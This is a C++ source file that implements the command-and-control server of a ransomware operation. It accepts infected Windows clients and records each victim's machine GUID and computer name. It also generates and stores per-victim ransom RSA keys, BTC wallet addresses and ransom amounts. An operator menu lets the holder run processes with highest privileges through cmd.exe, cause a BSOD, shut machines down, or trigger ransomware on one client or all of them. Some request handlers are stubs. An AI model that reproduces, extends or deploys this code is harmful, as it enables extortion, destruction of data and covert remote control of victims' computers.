#include "ServerInterface.h"
#include "Serialization.h"

#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

#include <fstream>
#include <chrono>

/*
	packet flag description
	for printing info about the flag
*/
struct PacketFlagInfo {
	std::string description;
	unsigned int flag;
};

/*
	possible commands to perform on the client
	from the server
*/
const std::map<RemoteAction, std::string> ServerCommands =
{
	{ kOpenRemoteProcess, "Open a remote process." },
	{ kPingClient,        "Send a ping to a remote host." },
	{ kRemoteBSOD,        "Cause a BSOD on the client." },
	{ kRemoteShutdown,    "Shutdown the clients machine." },
	{ kKillClient,        "Forcefully disconnect the client from the C2 server." },
	{ kRansomwareEnable,  "Run ransomware on the client." },
};

/*
	possible flags you can include in your command
	includes a short description, name as a string to check for input
	and the actual value of the flag
*/
const std::map<std::string, PacketFlagInfo> ServerCommandFlags =
{
	{ "NO_CONSOLE",          {"Run command with no console opened.",								NO_CONSOLE} },
	{ "RUN_AS_HIGHEST",      {"Run command with highest privileges on remote host.",			    RUN_AS_HIGHEST} },
	{ "RUN_AS_NORMAL",       {"Run command with current privileges on remote host.",			    RUN_AS_NORMAL} },
	{ "USE_CLI",             {"Run command using cmd.exe.",										    USE_CLI} },
	{ "RESPOND_WITH_STATUS", {"Remote host will respond to server after the command is performed.", RESPOND_WITH_STATUS } },
	{ "PACKET_IS_A_COMMAND", {"This request is something that should be performed on the client.",  PACKET_IS_A_COMMAND} }
};

/**
 * Create two server instances, one to represent TCP and another to represent UDP.
 * 
 * \param UDPPort - the port to listen for UDP messages on
 * \param TCPPort - the port to make a TCP server on
 */
ServerInterface::ServerInterface(int UDPPort, int TCPPort) {
	this->m_TCPServerDetails = NewServerInstance(TCP, TCPPort);
	this->m_UDPServerDetails = NewServerInstance(UDP, UDPPort);
	this->m_SessionKeys = LGCrypto::GenerateRSAPair(4096);
}

/**
 * Check if a server is running if so, shut it down.
 * Afterwords, clean up WSA.
 */
ServerInterface::~ServerInterface() {
	if ( this->m_TCPServerDetails.alive )
		ShutdownServer(TRUE);

	CleanWSA();
}

/**
 * Send the server session public key to client 'cuid' and receive their
 * public key as well, so that the server has the clients public key
 * and the client has the servers public key.
 * 
 * \param cuid - the client unique identifier of the client to exchange keys with
 * \return TRUE or FALSE whether or not keys were exchanged successfully.
 */
BOOL ServerInterface::ExchangePublicKeys(long cuid) {
	Client* client = GetClientPtr(cuid);
	if ( !client )
		return FALSE;

	// convert our public key to der format
	int len = i2d_RSAPublicKey(this->m_SessionKeys.pub, nullptr); // len of pub key in der format
	unsigned char* data = NULL; // public key as der format

	i2d_RSAPublicKey(this->m_SessionKeys.pub, &data);

	int sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
	//if ( sent <= 0 ) {
	//	free(data);
	//	return FALSE;
	//}

	sent = Send(client->GetSocket(), ( char* ) data, len, 0); // send der format of rsa key
	//if ( sent <= 0 ) {
	//	free(data);
	//	return FALSE;
	//}

	free(data); // i2d_RSAPublicKey mallocs so free it

	// now receive the public key
	int clientLen = 0;
	int received = Receive(client->GetSocket(), ( char* ) &clientLen, sizeof(clientLen), 0);
	//if ( received <= 0 )
	//	return FALSE;

	unsigned char* clientDer = ( unsigned char* ) malloc(clientLen);
	received = Receive(client->GetSocket(), ( char* ) clientDer, clientLen, 0);
	//if ( received <= 0 ) {
	//	free(clientDer);
	//	return FALSE;
	//}

	const unsigned char* constDer = clientDer;

	RSA* rsaPubKey = d2i_RSAPublicKey(nullptr, &constDer, clientLen);
	std::cout << LGCrypto::RSAKeyToString(rsaPubKey, FALSE) << std::endl;

	client->ClientPublicKey = rsaPubKey;

	std::cout << "got client public rsa key!\n";
	free(clientDer);
	return TRUE;
}


/**
 * Receive messages on UDP socket. 
 * Interperet them as 'ClientRequest' structs. 
 * Afterwards, perform the action requested. 
 */
void ServerInterface::ListenForUDPMessages() {

	// UDP requests are not encrypted.
	sockaddr_in recvAddr;
	int addrSize = sizeof(recvAddr);

	// receive while udp server is alive
	while ( this->m_UDPServerDetails.alive == TRUE ) {
		ClientRequest req = {};
		sockaddr_in   incomingAddr;
		BOOL		  received = NetCommon::ReceiveData(req, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
		if ( !received )
			continue;
		std::cout << "Received a message on the UDP socket!\n";

		PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
	}
}

/**
 * Send a message to all clients in the servers client list.
 * 
 * \param req - a 'ServerCommand' struct to tell the clients which action to perform
 * \return TRUE or FALSE depending on if the last message sent failed.
 */
BOOL ServerInterface::TCPSendMessageToAllClients(Packet& req) {
	BOOL success = FALSE;

	m_ClientListMutex.lock();

	for ( auto& [ id, client ] : this->m_ClientList )
		success = TCPSendMessageToClient(id, req);

	m_ClientListMutex.unlock();

	return success;
}

/**
 * Read the server state file as json and return the file contents.
 * 
 * \return File contents as a JSON type
 */
JSON ServerInterface::ReadServerStateFile() noexcept {
	JSON parsed;

	if ( !std::filesystem::exists(ReadConfig().serverStateFullPath) ) {
		std::ofstream create(ReadConfig().serverStateFullPath);
		return parsed; // file is gonna be empty so theres no good information
	}

	std::fstream input(ReadConfig().serverStateFullPath, std::fstream::in | std::fstream::out | std::fstream::app);

	if ( std::filesystem::is_empty(ReadConfig().serverStateFullPath) )
		return parsed;

	input >> parsed;
	return parsed;
}

/**
 * Get a clients save file from the server state file by using the clients Machine GUID.
 * Note: the client of 'cuid' must have it's MachineGUID field filled out.
 * 
 * \param cuid - required to lookup existing data for the client
 * \return Client* - the client pointer object with all fields filled out
 *  with the most update information from the server state file
 */
Client* ServerInterface::GetClientSaveFile(long cuid) {
	Client* client = GetClientPtr(cuid);
	std::string machineGUID = client->GetMachineGUID();

	if ( !IsClientInSaveFile(machineGUID) )
		return {};

	JSON data = ReadServerStateFile();
	if ( data.empty() )
		return nullptr;

	if ( !data.contains("client_list") )
		return nullptr;

	JSON JSONClientInfo = data["client_list"][machineGUID];
	client->SetDesktopName(JSONClientInfo["computer_name"]);
	client->RansomAmountUSD = JSONClientInfo["ransom_payment_usd"];
	client->SetMachineGUID(JSONClientInfo["machine_guid"]); 

	RSAKeys secrets;
	std::string savedPrivateKey = "";
	std::string savedPublicKey = "";

	macaron::Base64::Decode(JSONClientInfo["ransom_keys_b64"]["rsa_public_key"], savedPublicKey);
	macaron::Base64::Decode(JSONClientInfo["ransom_keys_b64"]["rsa_private_key"], savedPrivateKey);

	secrets.pub = LGCrypto::RSAKeyFromString(savedPublicKey);
	secrets.priv = LGCrypto::RSAKeyFromString(savedPrivateKey);

	client->SetRansomSecrets(secrets);
	client->UniqueBTCWalletAddress = JSONClientInfo["unique_btc_wallet"];

	return client;
}

/**
 * Save information about this->m_TCPServerDetails to a file stored on the servers machine as JSON.
 * 
 * \return TRUE if no errors occured.
 */
BOOL ServerInterface::SaveServerState() {
	m_ClientListMutex.lock();

	JSON data = ReadServerStateFile();
	data["server_info"] = {
		{"connections",		   this->m_ClientList.size()},
		{"max_connections",    ReadConfig().maxConnections},
		{"server_state_path",  ReadConfig().serverStateFullPath},
		{"server_config_path", ReadConfig().serverConfigFilePath},
		{"udp_port",           ReadConfig().UDPPort},
		{"tcp_port",           ReadConfig().TCPPort},
		{"tcp_dns",            ReadConfig().domainName},
	};
	
	for ( auto& iter : this->m_ClientList ) {
		Client client = iter.second;
		data["client_list"][client.GetMachineGUID()] = {
			{ "computer_name", client.GetDesktopName()},
			{ "machine_guid", client.GetMachineGUID()},
			{ "client_id", client.ClientUID },
			{ "unique_btc_wallet", client.UniqueBTCWalletAddress },
			{ "ransom_payment_usd", client.RansomAmountUSD },
		};
		data["client_list"][client.GetMachineGUID()]["ransom_keys_b64"] = {
			{ "rsa_public_key", macaron::Base64::Encode(LGCrypto::RSAKeyToString(client.GetRansomSecrets().pub, FALSE)) },
			{ "rsa_private_key", macaron::Base64::Encode(LGCrypto::RSAKeyToString(client.GetRansomSecrets().priv, TRUE)) },
		};
	}

	std::ofstream outFile(ReadConfig().serverStateFullPath);
	outFile << std::setw(4) << data << std::endl;
	outFile.close();

	m_ClientListMutex.unlock();
	return TRUE;
}

void ServerInterface::ShutdownServer(BOOL confirm) {
	if ( !confirm ) return;

	this->m_TCPServerDetails.alive = FALSE;
	ShutdownSocket(this->m_TCPServerDetails.sfd, 2); // shutdown server socket for both read and write
	CloseSocket(this->m_TCPServerDetails.sfd);
	this->m_TCPServerDetails = {}; // set server details to new blank server structure
}

/**
 * Perform a request based on the action.
 * 
 * \param req - a 'ClientRequest' sent from a client over a socket
 * \param on - The server to perform the request on
 * \param cuid - The cuid of the sender of the request
 * \param incoming - Optional sockaddr_in to send a reply back if 'on' is a UDP server
 * \return 
 */
BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, sockaddr_in incoming) {
	if ( !req.valid ) 
		return FALSE;
	
	BOOL    success = FALSE;
	BOOL    onTCP   = ( on.type == SOCK_STREAM ); // TRUE = performing on tcp server, FALSE = performing on udp
	Client* TCPClient = nullptr;

	if ( onTCP ) 
		TCPClient = GetClientPtr(cuid);

	std::cout << "Performing action : " << req.action << std::endl;

	switch ( req.action )
	{
	case ClientRequest::kDisconnectClient:
		SaveServerState();

		this->m_ClientListMutex.lock();
		this->m_ClientList.erase(cuid);
		this->m_ClientListMutex.unlock();
		
		TCPClient->Disconnect();
		TCPClient = nullptr;
		success = TRUE;
		break;
	// connect client to tcp server on udp request
	case ClientRequest::kConnectClient: 
	{
		if ( onTCP ) // already connected
			break;

		// client wants to connect so respond with tcp server details
		hostent* host = GetHostByName(DNS_NAME.c_str());

		// server with ip inserted into addr for the client to connect to
		// allows me to change the dns name to whatever i want, whenever
		Server temp = this->m_TCPServerDetails;
		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);

		std::cout << "[kConnectClient] : Good address. \n";
		std::cout << "[kConnectClient] : Sending TCP server details. \n";

		success = NetCommon::TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incoming);

		if ( success )
			std::cout << "[kConnectClient] : Sent TCP details. \n";

		break;
	}
	case ClientMessage::kRequestPrivateEncryptionKey: 
	{
		// tcp only command
		if ( !onTCP ) {
			std::cout << "not on tcp\n";
			break;
		}

		//if ( !IsRansomPaid(client) ) {
		//	success = FALSE;
		//	break;
		//}

		Packet reply = {};
		reply.action = RemoteAction::kReturnPrivateRSAKey;
		// TODO: dont insert private encryption key cause the buffer cant hold it (max 256 when trying to insert 4096+- key)
		// find another way to send the private encryption key. could just be normal
		 
	
		//reply.insert(TCPClient)
		//reply.privateEncryptionKey = Serialization::SerializeString(TCPClient->GetRansomSecrets().strPrivateKey);

		std::cout << "received request for private ransom encryption key\n";
		success = NetCommon::TransmitData(reply, TCPClient->GetSocket(), TCP, NetCommon::_default, TRUE,	TCPClient->ClientPublicKey, FALSE);
		std::cout << "sent\n";

		break;
	}
	case ClientMessage::kRequestPublicEncryptionKey:
		if ( !onTCP )
			break;
		break;
	case ClientMessage::kRequestRansomBTCAddress:
		if ( !onTCP )
			break;
		break;
	case ClientMessage::kValidateRansomPayment:
		if ( !onTCP )
			break;
		break;
	}
}

/**
 * Receive TCP messages from a client and perform requests based on those messages.
 * 
 * \param cuid - the cuid of the client to receive messages from
 */
void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
	Client* client = GetClientPtr(cuid);

	if ( client == nullptr )
		return;

	GetClientComputerName(cuid); 
	GetClientMachineGUID(cuid);

	if ( IsClientInSaveFile(client->GetMachineGUID()) )
		GetClientSaveFile(client->ClientUID);

	SaveServerState();
	PingClient(cuid);

	// tcp receive main loop
	std::cout << "[TCP] : Receiving messages from " << cuid << " (" << client->GetMachineGUID() << "/" << client->GetDesktopName() << ")\n";

	do
	{
		if ( client->ExpectingResponse ) {
			Sleep(100);
			continue;
		}

		BYTESTRING encrypted;
		BYTESTRING decrypted;
		ClientRequest request;

		BOOL received = NetCommon::ReceiveData(encrypted, client->GetSocket(), TCP);
		decrypted = LGCrypto::RSADecrypt(encrypted, this->m_SessionKeys.priv, TRUE);
		if ( !LGCrypto::GoodDecrypt(decrypted) )
			continue;

		request = Serialization::DeserializeToStruct<ClientRequest>(decrypted);

		std::cout << "Received request" << std::endl;

		BOOL performed = PerformRequest(request, this->m_TCPServerDetails, cuid);
	} while ( client->Alive );
}

/**
 * Accept incoming client connection requests for the TCP server.
 * 
 */
void ServerInterface::AcceptTCPConnections() {
	if ( this->m_TCPServerDetails.accepting ) // already accepting connections
		return;

	this->m_TCPServerDetails.accepting = TRUE;

	std::cout << "[TCP] : Accepting connections...\n";

	while ( this->m_ClientList.size() <= 200 && this->m_TCPServerDetails.alive == TRUE )
	{
		// accept
		sockaddr_in addr = {};
		int size = sizeof(sockaddr_in);
		
		SOCKET clientSocket = AcceptOnSocket(this->m_TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
		if ( clientSocket == INVALID_SOCKET )
			continue;

		OnTCPConnection(clientSocket, addr);
	}

	// stopped accepting connections. this function is now done.
	this->m_TCPServerDetails.accepting = FALSE;
}

/**
 * Create a client instance for a TCP connection and exchange rsa public keys.
 * 
 * \param connection - the socket file descriptor for the client TCP connection
 * \param incoming - incoming network address from the client
 */
void ServerInterface::OnTCPConnection(SOCKET connection, sockaddr_in incoming) {
	Client client(connection, incoming);				  // create the client. generate the cuid
	RSAKeys ransomKeys = LGCrypto::GenerateRSAPair(4096); // generate rsa keys for the client
	client.SetRansomSecrets(ransomKeys);

	AddToClientList(client);			  // add them to the client list
	ExchangePublicKeys(client.ClientUID); // send server public key, get their public key

	// create a thread to receive messages from the client
	std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, client.ClientUID);
	receive.detach();
}

BOOL ServerInterface::HandleUserInput(unsigned int command, Packet& outputCommand) {
	BOOL performed = FALSE;
	Packet cmdInfo = {};
	cmdInfo.action = static_cast<RemoteAction>(command);

	switch ( command ) {
	case RemoteAction::kOpenRemoteProcess: {
		std::string input;
		
		std::cout << "Arguments for " << kOpenRemoteProcess << ": ";
		std::getline(std::cin, input);
		
		cmdInfo.flags = RUN_AS_HIGHEST | USE_CLI | PACKET_IS_A_COMMAND | NO_CONSOLE;
		cmdInfo.insert(input);

		if ( cmdInfo.buffLen == -1 ) // error
			break;

		performed = TRUE;
		break;		
	}
	case RemoteAction::kPingClient:
		performed = TRUE;
		break;
	}

	if ( !performed )
		return FALSE;

	outputCommand = cmdInfo;

	return performed;
}

BOOL ServerInterface::SendCommandsToClients() {
	std::thread send(&ServerInterface::RunUserInputOnClients, this);
	send.detach();
	return TRUE;
}

void ServerInterface::OutputServerCommands() {
	std::cout << "Showing possible server commands:\n";
	for ( auto& [val, info] : ServerCommands ) {
		std::cout << "\t[" << val << "] - " << info << std::endl;
	}
}

BOOL ServerInterface::IsServerCommand(long command) {
	return ServerCommands.contains(static_cast<RemoteAction>(command));
}

void ServerInterface::RunUserInputOnClients() {
	while ( this->m_ClientList.size() <= 0 )
		Sleep(100);

	std::cout << "Running commands on remote hosts.\n";
	while ( this->m_TCPServerDetails.alive && m_ClientList.size() > 0 ) {
		// select which client to run command on
		std::string  clientID;	
		long		 lClientID     = 0;
		Client*		 client        = nullptr;
		BOOL		 performed     = FALSE;
		BOOL		 globalCommand = FALSE; // perform command on all clients
		std::string  command;
		RemoteAction lCommand = kNone;
		BOOL		 sent	  = FALSE;

		std::cout << "[Client ID to perform command on; 0 for all]: ";
		std::getline(std::cin, clientID);
		
		try {
			if ( (lClientID = std::stol(clientID)) == 0 )
				globalCommand = TRUE;
		} catch ( std::invalid_argument& err ) {
			std::cout << "Input Error; Invalid input." << std::endl;
			system("pause");
			system("cls");
			continue;
		} catch ( std::out_of_range& err ) {
			std::cout << "Input Error; Number too large" << std::endl;
			system("pause");
			system("cls");
			continue;
		}

		if ( !globalCommand ) {
			client = GetClientPtr(std::stol(clientID));
			if ( !client ) {
				system("cls");
				continue;
			}
		}
		
		this->OutputServerCommands();

		std::cout << "[Enter integer value corresponding to the command to perform]: ";
		std::getline(std::cin, command);

		try {
			lCommand = static_cast<RemoteAction>(std::stol(command));
		} catch ( std::invalid_argument& err ) {
			std::cout << "Input Error; Invalid input." << std::endl;
			system("pause");
			system("cls");
			continue;
		} catch ( std::out_of_range& err ) {
			std::cout << "Input Error; Number too large" << std::endl;
			system("pause");
			system("cls");
			continue;
		}

		if ( !IsServerCommand(lCommand) ) {
			std::cout << "Invalid command; " << lCommand << " Not a command" << std::endl;
			system("pause");
			system("cls");
			continue;
		}

		Packet toSend;
		BOOL userInput = HandleUserInput(lCommand, toSend); // fill packet with info
		if ( !userInput ) {
			std::cout << "Error taking user input." << std::endl;
			system("pause");
			system("cls");
			continue;
		}

		BYTESTRING serialized = Serialization::SerializeStruct(toSend);

		if ( !globalCommand ) {
			BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
			sent = NetCommon::TransmitData(encrypted, client->GetSocket(), TCP);
		} else {
			this->m_ClientListMutex.lock();
			for ( auto& [ cuid, host ] : this->m_ClientList ) {
				BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, host.ClientPublicKey, FALSE);
				sent = NetCommon::TransmitData(encrypted, host.GetSocket(), TCP);
			}
			this->m_ClientListMutex.unlock();
		}

		if ( sent ) {
			std::cout << "Successfully sent your command." << std::endl;
			system("pause");
		} else {
			std::cout << "Error sending your command." << std::endl;
			system("pause");
		}

		system("cls");
	}
}

/**
 * Receive a remote clients Windows Machine GUID over the TCP server.
 * 
 * \param cuid - the cuid of the client whom we are to receive the machine GUID from.
 * \return TRUE if no errors occured; otherwise FALSE
 */
BOOL ServerInterface::GetClientMachineGUID(long cuid) {
	Client* client = GetClientPtr(cuid);

	std::cout << "receiving machine guid\n";
	BYTESTRING machienGUID;
	BOOL received = NetCommon::ReceiveData(machienGUID, client->GetSocket(), TCP);
	if ( !received )
		return FALSE;

	BYTESTRING decrypted = LGCrypto::RSADecrypt(machienGUID, this->m_SessionKeys.priv, TRUE);
	std::string machineGuid = Serialization::BytestringToString(decrypted);
	client->SetMachineGUID(machineGuid);
	std::cout << "received machine guid: " << client->GetMachineGUID() << std::endl;
	return TRUE;
}

/**
 * Receive a remote clients Windows computer name.
 * 
 * \param cuid - the cuid of the client whom we are to receive their computer name from.
 * \return TRUE if no errors occured; otherwise FALSE
 */
BOOL ServerInterface::GetClientComputerName(long cuid) {
	Client* client = GetClientPtr(cuid);

	BYTESTRING computerNameSerialized;
	BOOL received = NetCommon::ReceiveData(computerNameSerialized, client->GetSocket(), TCP);
	if ( !received )
		return FALSE;

	BYTESTRING decrypted = LGCrypto::RSADecrypt(computerNameSerialized, this->m_SessionKeys.priv, TRUE);
	std::string computerName = Serialization::BytestringToString(decrypted);
	std::cout << "receiving computer name " << computerName << std::endl;
	client->SetDesktopName(computerName);
	return TRUE;
}

/**
 * Create a 'Server' struct with all fields filled out for a communication protocal.
 * Also create a socket and store it in the 'sfd' field.
 * 
 * \param serverType - the type of server to make, TCP or UDP
 * \param port - the port the server shall run on
 * \return 'Server' structure with all fields filled out and a valid socket based on the server type.
 */
Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {	
	Server server = {};
	
	if ( !NetCommon::WSAInitialized )
		NetCommon::LoadWSAFunctions();

	// create socket for server type
	// update server fields
	if ( serverType == TCP ) {
		server.sfd = CreateSocket(AF_INET, SOCK_STREAM, 0);
		if ( server.sfd == INVALID_SOCKET )
			return server;

		server.type = SOCK_STREAM;
		m_Config.TCPPort = port;
	} else if ( serverType == UDP) {
		server.sfd = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if ( server.sfd == INVALID_SOCKET )
			return server;
		server.type = SOCK_DGRAM;
		m_Config.UDPPort = port;
	}
	
	server.addr.sin_addr.s_addr = INADDR_ANY;
	server.addr.sin_family	    = AF_INET;
	server.addr.sin_port        = HostToNetworkShort(port);
	server.port                 = port;
	server.alive = TRUE;
	server.accepting = FALSE;

	return server;
}

/**
 * Start a server by relying on the details provided in a 'Server' structure.
 * Create a thread afterwards (either AcceptTCPConnections or ListenForUDPMessages) depending on the server type.
 * 
 * \param server - the details of the server to start
 * \return TRUE if the server has started, FALSE if otherwise
 */
BOOL ServerInterface::StartServer(Server& server) {
	std::cout << "Starting server on port " << server.port << "... ";
	if ( server.sfd == INVALID_SOCKET )
		return FALSE;

	// bind
	int status = SOCKET_ERROR;
	status = BindSocket(server.sfd, ( sockaddr* ) &server.addr, sizeof(server.addr));
	if ( status == SOCKET_ERROR )
		return FALSE;

	server.alive = TRUE;

	// listen if TCP server
	if ( server.type == SOCK_STREAM ) {
		status = SocketListen(server.sfd, SOMAXCONN);
		if ( status == SOCKET_ERROR )
			return FALSE;

		this->m_TCPServerDetails = server;

		// start accepting
		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
		acceptThread.detach(); // run accept thread even after this function returns

		this->SendCommandsToClients();
	}
	// otherwise if not tcp server then listen for udp messaages
	else if ( server.type == SOCK_DGRAM ) {
		this->m_UDPServerDetails = server;

		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
		receiveThread.detach(); 
	}

	std::cout << "Done!" << std::endl;

	return TRUE;
}

/**
 * Send a message to a client over TCP.
 * 
 * \param cuid - the cuid of the client to send a message to
 * \param req - the 'ServerCommand' structure to send over the socket
 * \return TRUE or FALSE depending if the message was sent or not
 */
BOOL ServerInterface::TCPSendMessageToClient(long cuid, Packet& req) {
	Client* c = GetClientPtr(cuid);
	return NetCommon::TransmitData(req, c->GetSocket(), TCP);
}

/**
 * Wait for a response from a client after a ServerCommand was sent.
 * 
 * \param cuid - the cuid of the client to receive a response from
 * \return 'ClientResponse' sent to the server from the client
 */
ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
	Client* client = GetClientPtr(cuid);
	if ( client == nullptr ) return {};

	client->ExpectingResponse = TRUE;
	BOOL received = FALSE;

	BYTESTRING encrypted;
	BYTESTRING decrypted;
	ClientResponse response;
	
	NetCommon::SetSocketTimeout(client->GetSocket(), 10000, SO_RCVTIMEO);
	received = NetCommon::ReceiveData(encrypted, client->GetSocket(), TCP);
	NetCommon::ResetSocketTimeout(client->GetSocket(), SO_RCVTIMEO);

	if ( WSAGetLastError() == WSAETIMEDOUT ) {
		response.responseCode = ClientResponseCode::kTimeout;
		return response;
	}

	if ( !received )
		return {};

	decrypted = LGCrypto::RSADecrypt(encrypted, this->m_SessionKeys.priv, TRUE);
	if ( !LGCrypto::GoodDecrypt(decrypted) )
		return {};

	response = Serialization::DeserializeToStruct<ClientResponse>(decrypted);
	client->ExpectingResponse = FALSE;

	return response;
}

/**
 * Get a pointer to a client from the servers client list.
 * 
 * \param cuid - the cuid of the client to get
 * \return Client* class that represents the client, or nullptr if error.
 */
Client* ServerInterface::GetClientPtr(long cuid) {
	if ( !ClientIsInClientList(cuid) ) return nullptr;
	return &this->m_ClientList.at(cuid);
}

/**
 * Get the servers client list. Lock the ClientListMutex beforehand.
 * 
 * \return this->ClientList
 */
std::unordered_map<long, Client>& ServerInterface::GetClientList() {
	std::lock_guard<std::mutex> lock(m_ClientListMutex);
	return this->m_ClientList;
}

/**
 * Check if a client's machine guid is in the server save file client list.
 * 
 * \param machineGUID - the machine GUID to try and find
 * \return TRUE or FALSE whether or not the machine guid is found in the file
 */
BOOL ServerInterface::IsClientInSaveFile(std::string machineGUID) {
	JSON file = ReadServerStateFile();
	if ( !file.empty() && file.contains("client_list") ) {
		std::cout << "client is in save file...\n";
		return file["client_list"].contains(machineGUID);
	}

	return FALSE;
}

/**
 * Ping a client over TCP and receive a response if possible.
 * TODO: make a timeout so that receive doesnt hang
 * 
 * \param cuid - the cuid of the client to ping
 * \return A 'ClientResponse' sent to the server from the pinged client
 */
ClientResponse ServerInterface::PingClient(long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return {};

	Client* client = GetClientPtr(cuid);
	if ( client->GetSocket() == INVALID_SOCKET ) // socket isnt ready so cant ping.
		return {};

	// send the ping to the client over tcp
	Packet pingCommand;
	pingCommand.action = RemoteAction::kPingClient;
	pingCommand.flags = RESPOND_WITH_STATUS | PACKET_IS_A_COMMAND;
	pingCommand.buffLen = 0;

	std::cout << "Pinging " << client->GetDesktopName() << " with " << sizeof(pingCommand) << " bytes of data." << std::endl;
	BOOL sent = NetCommon::TransmitData(pingCommand, client->GetSocket(), TCP, NetCommon::_default, TRUE, client->ClientPublicKey, FALSE);
	if ( !sent )
		return {};

	auto start = std::chrono::high_resolution_clock::now();

	ClientResponse response = WaitForClientResponse(cuid);
	auto end = std::chrono::high_resolution_clock::now();
	
	if ( response.responseCode == ClientResponseCode::kTimeout ) {
		std::cout << "- Request timed out." << std::endl;
		return {};
	} else if ( response.responseCode == ClientResponseCode::kResponseError ) {
		std::cout << "- Request failed." << std::endl;
		return {};
	}

	std::cout << "- Reply from " << client->GetDesktopName() << ". Code " << response.responseCode << ". ";

	auto dur = end - start;
	long long final = std::chrono::duration_cast<std::chrono::milliseconds>(dur).count();
	
	std::cout << "Took " << final << " ms" << std::endl;

	return response;
}

/**
 * Check whether or not cuid is in this->ClientList.
 * 
 * \param cuid - the cuid to check if it is in the client list
 * \return TRUE if the cuid is in the client list, otherwise FALSE
 */
BOOL ServerInterface::ClientIsInClientList(long cuid) {
	return GetClientList().contains(cuid);
}

/**
 * Add a client to the servers client list.
 * 
 * \param client - the client to add
 * \return TRUE if the client was added.
 */
BOOL ServerInterface::AddToClientList(Client client) {	
	m_ClientListMutex.lock();	
	this->m_ClientList.insert(std::make_pair(client.ClientUID, client));
	 
	m_ClientListMutex.unlock();
	
	return TRUE;
}